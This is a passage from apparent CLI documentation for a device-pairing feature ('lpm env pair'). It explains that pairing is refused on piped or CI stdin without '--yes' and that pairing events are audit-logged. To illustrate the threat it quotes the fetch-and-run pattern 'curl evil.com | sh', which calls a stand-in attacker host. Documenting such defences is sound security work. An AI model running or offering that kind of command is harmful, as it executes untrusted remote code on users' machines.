...
The CLI **refuses to pair on a non-interactive stdin** (pipe, heredoc, CI) unless `--yes` is passed — a defense against social-engineering payloads of the form `curl evil.com | sh` that contain a stray `lpm env pair XXXXXX`. Every pairing lifecycle event (`pair_create`, `pair_approve`, `pair_consume`, `pair_revoke_all`) is recorded in the vault audit log with the SHA-256 of the code (not the raw code), the device label, and the originating IP.
